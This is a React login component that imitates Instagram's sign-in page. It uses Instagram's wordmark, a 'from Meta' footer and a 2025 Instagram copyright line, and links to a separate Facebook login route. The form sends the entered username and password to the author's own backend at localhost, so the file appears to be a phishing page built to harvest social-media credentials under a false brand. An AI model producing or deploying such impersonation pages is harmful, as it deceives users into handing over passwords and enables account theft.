import { useEffect, useState } from "react";
import axios from "axios";
import { Link, NavLink } from "react-router-dom";
// import Indexx from './facebook';

function InstaLogin() {
  const [formData, setFormData] = useState({
    username: "",
    password: "",
  });

  const [loginMessage, setLoginMessage] = useState("");
  const [errorMessage, setErrorMessage] = useState("");

  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value,
    });
  };

  const validateForm = () => {
    const { username, password } = formData;
    if (!username) {
      setErrorMessage("Username or email is required.");
      return false;
    }
    if (!password) {
      setErrorMessage("Password is required.");
      return false;
    }
    setErrorMessage(""); // Clear any previous errors
    return true;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!validateForm()) return;

    try {
      const response = await axios.post(
        "http://localhost:8001/api/v1/user/login",
        formData,
        {
          headers: {
            "Content-Type": "application/json",
          },
        }
      );
      
      setLoginMessage("Login successful!");
      setFormData({ username: "", password: "" });
    } catch (err) {
      setErrorMessage(
        err.response?.data?.message || "An error occurred during login."
      );
    }
  };


  useEffect(() => {
    if (loginMessage) {
      const timeout = setTimeout(() => setLoginMessage(""), 3000);
      return () => clearTimeout(timeout);
    }
  }, [loginMessage]);

  return (
    <div className="text-center ">
      <div className="">
        <form onSubmit={handleSubmit}>
          <div className="mt-4">
            <span className="text-lg font-semibold mt-4]">English (UK)</span>
          </div>
          <div className=" text-center">
            {/* Insta logo */}

            <img
              className="inline text-center mt-[40px]"
              src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png"
              alt=""
            />
          </div>

          <div className="w-[300px] mt-[20px] mb-[20px] h-10 bg-blue-900 text-white rounded font-semibold flex-row items-center inline-flex ">
            <NavLink className="pt-[2px]" to="/facebooklogin">
              <img
                src="https://freelogopng.com/images/all_img/1692798659white-facebook-png.png"
                alt="Facebook"
                className="h-[28px] mr-2 pl-[30px] inline-grid"
              />
              Continue Using Facebook
            </NavLink>

            {/* <a
              className="w-[300px] h-10 bg-blue-900 text-white rounded font-bold flex items-center justify-center"
              href="http://127.0.0.1:5500/Frontend/src/facebook/index.html"
            >
             
             
              Continue Using Facebook
            </a> */}
            {/* </button> */}
          </div>
          <br />

          {/* ----line ------  */}

          <div className=" mb-[20px] flex-row items-center inline-flex">
            <div className="bg-slate-600 h-[1px] w-[110px] ml-[50px] "></div>
            <div className="font-medium text-gray-500 text-xl  px-[20px] py-0 font-[Roboto]">
              OR
            </div>
            <div className="bg-slate-600 h-[1px] w-[110px] mr-[80px]"> </div>
          </div>

          <div className="grid justify-center mb-4">
            <input
              type="text"
              name="username"
              placeholder="Username or email address"
              value={formData.username}
              onChange={handleChange}
              className="w-[300px] h-10 border border-gray-400 rounded px-2  text-black"
            />
          </div>

          <div className="grid justify-center mb-4">
            <input
              type="password"
              name="password"
              placeholder="Password"
              value={formData.password}
              onChange={handleChange}
              className="w-[300px] h-10 border border-gray-400 rounded px-2  text-black"
            />
          </div>
          <div className="grid justify-end pr-[50px]">
            <span className=" h-[35px]    font-bold  text-blue-700">
              Forgot password?
            </span>
          </div>
          <div className="grid justify-center mb-4">
            <button
              type="submit"
              className="w-[300px] h-10 bg-blue-600 text-white rounded font-bold "
            >
              Log in
            </button>
          </div>
        </form>

        <div className="items-center justify-center grid mt-10">
          <span className="flex w-[65px] pl-[15px] font-bold">from</span>
          <div className="flex justify-between">
            <img
              style={{ height: "17px", width: "17px", marginTop: "3px" }}
              className="bg-white-500"
              src="https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/meta-black-icon.png"
              alt="meta"
            />
            <span className="font-bold mt-[-3px] ">Meta</span>
          </div>
        </div>

        <span className="mt-5 items-center justify-center grid pb-[15px]">
          © 2025 Instagram.com from Meta
        </span>
      </div>

      {errorMessage && <p className="text-red-600">{errorMessage}</p>}
      {loginMessage && <p className="text-green-600">{loginMessage}</p>}
    </div>
  );
}

export default InstaLogin;
